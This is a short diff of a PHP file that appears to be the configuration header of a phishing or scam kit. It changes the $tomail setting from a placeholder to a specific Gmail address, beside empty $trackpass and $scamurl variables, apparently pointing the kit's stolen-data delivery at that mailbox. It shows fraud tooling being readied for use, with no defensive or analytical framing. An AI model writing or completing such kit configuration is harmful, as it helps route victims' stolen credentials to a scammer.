@@ -1,7 +1,7 @@
 <?php 
 
 
-$tomail=" your email "; $trackpass=""; $scamurl=""; 
+$tomail="testerverifier4k@gmail.com"; $trackpass=""; $scamurl=""; 
 
 
 
